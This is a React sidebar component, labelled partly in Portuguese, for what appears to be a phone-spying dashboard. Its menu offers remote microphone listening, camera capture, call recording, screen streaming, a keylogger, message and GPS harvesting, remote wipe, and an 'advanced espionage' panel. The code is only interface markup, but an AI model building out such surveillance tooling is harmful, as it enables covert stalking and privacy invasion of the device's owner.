import React from 'react';
import { useNavigate } from 'react-router-dom';
import {
  Smartphone,
  LayoutDashboard,
  Mic,
  Camera,
  Phone,
  Scan,
  Cast,
  LayoutGrid,
  Globe,
  WifiOff,
  Bot,
  Sparkles,
  MessageSquare,
  FolderLock,
  ChevronDown,
  ChevronUp,
  Keyboard,
  MapPin,
  Image as ImageIcon,
  PhoneCall,
  Users,
  History as HistoryIcon,
  AppWindow,
  Clock,
  Bell
} from 'lucide-react';
import { useTranslation } from 'react-i18next';

interface SidebarProps {
  devices: any[];
  selectedId: string | null;
  onSelect: (id: string) => void;
  activeView: string;
  onViewChange: (view: string) => void;
  onAddDevice: () => void;
}

const Sidebar: React.FC<SidebarProps> = ({ devices, selectedId, onSelect, activeView, onViewChange, onAddDevice }) => {
  const { t } = useTranslation();
  const navigate = useNavigate();

  const selectedDevice = devices.find(d => d.id === selectedId) || devices[0];

  // Handler para navegação dos menus de controle remoto
  const handleRemoteControl = (type: string) => {
    const commandMap: Record<string, string> = {
      'mic': 'activate_mic',
      'camera': 'camera_capture',
      'calls': 'record_call',
      'screenshots': 'take_screenshot',
      'stream': 'start_stream',
      'lock': 'lock_device',
      'wipe': 'wipe_device'
    };

    navigate('/remote-control', {
      state: { command: commandMap[type], deviceId: selectedDevice?.id }
    });
  };

  return (
    <div className="w-80 bg-bg-secondary border-r border-border-color flex flex-col h-full overflow-y-auto custom-scrollbar">
      
      {/* My Subscriptions Section */}
      <div className="p-4">
        <button 
          onClick={onAddDevice}
          className="w-full mb-4 bg-accent-blue/10 hover:bg-accent-blue/20 border border-accent-blue text-accent-blue py-2 rounded flex items-center justify-center gap-2 transition-all font-tactical tracking-wide text-sm font-bold shadow-[0_0_10px_rgba(0,212,255,0.1)] hover:shadow-[0_0_15px_rgba(0,212,255,0.3)]"
        >
          <Scan size={16} />
          {t('sidebar.add_device') || 'CONECTAR DISPOSITIVO'}
        </button>

        <div className="flex items-center justify-between text-text-secondary mb-2 cursor-pointer hover:text-accent-blue transition-colors">
          <h3 className="text-xs font-bold uppercase tracking-widest font-tactical">
            {t('sidebar.my_subscriptions')}:
          </h3>
          <ChevronDown size={14} />
        </div>
        
        {/* Device Selector (Dropdown-like appearance but static list for now) */}
        {devices.length > 0 ? (
           devices.map(device => (
            <div 
              key={device.id}
              onClick={() => onSelect(device.id)}
              className={`flex items-center justify-between p-3 rounded cursor-pointer transition-colors mb-2
                ${selectedId === device.id ? 'bg-bg-tertiary border border-accent-blue/30' : 'hover:bg-bg-tertiary border border-transparent'}
              `}
            >
              <div className="flex items-center gap-3">
                <Smartphone size={20} className={selectedId === device.id ? 'text-accent-blue' : 'text-text-muted'} />
                <span className={`text-sm font-bold font-tactical ${selectedId === device.id ? 'text-accent-blue' : 'text-text-primary'}`}>
                  {device.model}
                </span>
              </div>
              <span className="text-[10px] bg-gradient-to-r from-purple-500 to-pink-500 text-white px-2 py-0.5 rounded-full font-bold uppercase tracking-wider">
                EXTREME
              </span>
            </div>
           ))
        ) : (
            <div className="p-3 text-text-muted text-xs italic">
                {t('command.no_assets')}
            </div>
        )}
      </div>

      <div className="h-px bg-border-color mx-4 mb-4" />

      {/* Main Navigation */}
      <nav className="flex-1 px-2 space-y-1">
        
        <NavItem 
          icon={<LayoutDashboard size={20} />} 
          label={t('sidebar.dashboard')} 
          active={activeView === 'dashboard'}
          onClick={() => onViewChange('dashboard')}
          highlight
        />

        <div className="pt-4 pb-2 px-4 flex items-center justify-between text-text-secondary">
          <h3 className="text-xs font-bold uppercase tracking-widest font-tactical">
            {t('sidebar.remote_control')}
          </h3>
          <ChevronUp size={14} />
        </div>

        <NavItem
          icon={<Mic size={18} />}
          label={t('sidebar.surroundings_listening')}
          active={activeView === 'mic'}
          onClick={() => handleRemoteControl('mic')}
        />
        <NavItem
          icon={<Camera size={18} />}
          label={t('sidebar.remote_camera')}
          active={activeView === 'camera'}
          onClick={() => handleRemoteControl('camera')}
        />
        <NavItem
          icon={<Phone size={18} />}
          label={t('sidebar.call_recorder')}
          active={activeView === 'calls'}
          onClick={() => handleRemoteControl('calls')}
        />
        <NavItem
          icon={<Scan size={18} />}
          label={t('sidebar.live_screenshots')}
          active={activeView === 'screenshots'}
          onClick={() => handleRemoteControl('screenshots')}
        />
        <NavItem
          icon={<Cast size={18} />}
          label={t('sidebar.live_screen_streaming')}
          active={activeView === 'stream'}
          onClick={() => handleRemoteControl('stream')}
        />
        <NavItem 
          icon={<LayoutGrid size={18} />} 
          label={t('sidebar.block_apps')} 
          active={activeView === 'block_apps'}
          onClick={() => onViewChange('block_apps')}
        />
        <NavItem 
          icon={<Globe size={18} />} 
          label={t('sidebar.block_websites')} 
          active={activeView === 'block_websites'}
          onClick={() => onViewChange('block_websites')}
        />
        <NavItem 
          icon={<WifiOff size={18} />} 
          label={t('sidebar.block_wifi')} 
          active={activeView === 'block_wifi'}
          onClick={() => onViewChange('block_wifi')}
        />

        <div className="pt-4 pb-2 px-4 flex items-center justify-between text-text-secondary">
          <h3 className="text-xs font-bold uppercase tracking-widest font-tactical">
            {t('sidebar.ai_tools')}
          </h3>
          <ChevronUp size={14} />
        </div>

        <NavItem 
          icon={<Bot size={18} />} 
          label="ChatGPT 4.0" 
          active={activeView === 'chatgpt'}
          onClick={() => onViewChange('chatgpt')}
        />
        <NavItem 
          icon={<Sparkles size={18} />} 
          label="Gemini Pro" 
          active={activeView === 'gemini'}
          onClick={() => onViewChange('gemini')}
        />

        <div className="pt-4 pb-2 px-4 flex items-center justify-between text-text-secondary">
          <h3 className="text-xs font-bold uppercase tracking-widest font-tactical">
            {t('sidebar.general_data') || 'DADOS GERAIS'}
          </h3>
          <ChevronUp size={14} />
        </div>

        <NavItem 
          icon={<Keyboard size={18} />} 
          label={t('sidebar.keylogger') || 'Keylogger'} 
          active={activeView === 'keylogger'}
          onClick={() => onViewChange('keylogger')}
        />
        <NavItem 
          icon={<MessageSquare size={18} />} 
          label={t('sidebar.social_messages') || 'Redes Sociais'} 
          active={activeView === 'social_messages'}
          onClick={() => onViewChange('social_messages')}
        />
        <NavItem 
          icon={<MapPin size={18} />} 
          label={t('sidebar.locations') || 'Localização GPS'} 
          active={activeView === 'locations'}
          onClick={() => onViewChange('locations')}
        />
        <NavItem 
          icon={<ImageIcon size={18} />} 
          label={t('sidebar.media_gallery') || 'Fotos & Vídeos'} 
          active={activeView === 'media_gallery'}
          onClick={() => onViewChange('media_gallery')}
        />
        <NavItem 
          icon={<PhoneCall size={18} />} 
          label={t('sidebar.call_history') || 'Histórico Chamadas'} 
          active={activeView === 'call_history'}
          onClick={() => onViewChange('call_history')}
        />
        <NavItem 
          icon={<Users size={18} />} 
          label={t('sidebar.contacts') || 'Contatos'} 
          active={activeView === 'contacts'}
          onClick={() => onViewChange('contacts')}
        />
        <NavItem 
          icon={<HistoryIcon size={18} />} 
          label={t('sidebar.browser_history') || 'Histórico Web'} 
          active={activeView === 'browser_history'}
          onClick={() => onViewChange('browser_history')}
        />
        <NavItem 
          icon={<AppWindow size={18} />} 
          label={t('sidebar.installed_apps') || 'Apps Instalados'} 
          active={activeView === 'installed_apps'}
          onClick={() => onViewChange('installed_apps')}
        />
        <NavItem 
          icon={<Clock size={18} />} 
          label={t('sidebar.timeline') || 'Linha do Tempo'} 
          active={activeView === 'timeline'}
          onClick={() => onViewChange('timeline')}
        />
        <NavItem 
          icon={<Bell size={18} />} 
          label={t('sidebar.alerts') || 'Alertas'} 
          active={activeView === 'alerts'}
          onClick={() => onViewChange('alerts')}
        />

        <div className="pt-4 pb-2 px-4 flex items-center justify-between text-text-secondary">
          <h3 className="text-xs font-bold uppercase tracking-widest font-tactical">
            {t('sidebar.monitoring') || 'MONITORAMENTO'}
          </h3>
          <ChevronUp size={14} />
        </div>

        <NavItem 
          icon={<MessageSquare size={18} />} 
          label={t('sidebar.keywords') || 'Palavras-Chave'} 
          active={activeView === 'keywords'}
          onClick={() => onViewChange('keywords')}
        />

        <NavItem 
          icon={<FolderLock size={18} />} 
          label="Espionagem Avançada" 
          active={activeView === 'spy_panel'}
          onClick={() => onViewChange('spy_panel')}
          highlight
        />

      </nav>
    </div>
  );
};

const NavItem: React.FC<{ 
  icon: React.ReactNode, 
  label: string, 
  active?: boolean, 
  onClick: () => void,
  highlight?: boolean
}> = ({ icon, label, active, onClick, highlight }) => (
  <button
    onClick={onClick}
    className={`
      w-full flex items-center gap-3 px-4 py-3 rounded-lg transition-all group relative overflow-hidden
      ${active 
        ? 'bg-bg-tertiary text-accent-blue font-bold shadow-[inset_4px_0_0_0_#00d4ff]' 
        : 'text-text-secondary hover:bg-bg-tertiary hover:text-text-primary'}
      ${highlight && active ? 'bg-gradient-to-r from-bg-tertiary to-bg-secondary' : ''}
    `}
  >
    {/* Active Glow Background */}
    {active && highlight && (
      <div className="absolute inset-0 bg-accent-blue/5 pointer-events-none" />
    )}
    
    <div className={`transition-colors ${active ? 'text-accent-blue' : 'text-text-secondary group-hover:text-text-primary'}`}>
      {icon}
    </div>
    <span className="text-sm font-mono tracking-tight">{label}</span>
  </button>
);

export default Sidebar;
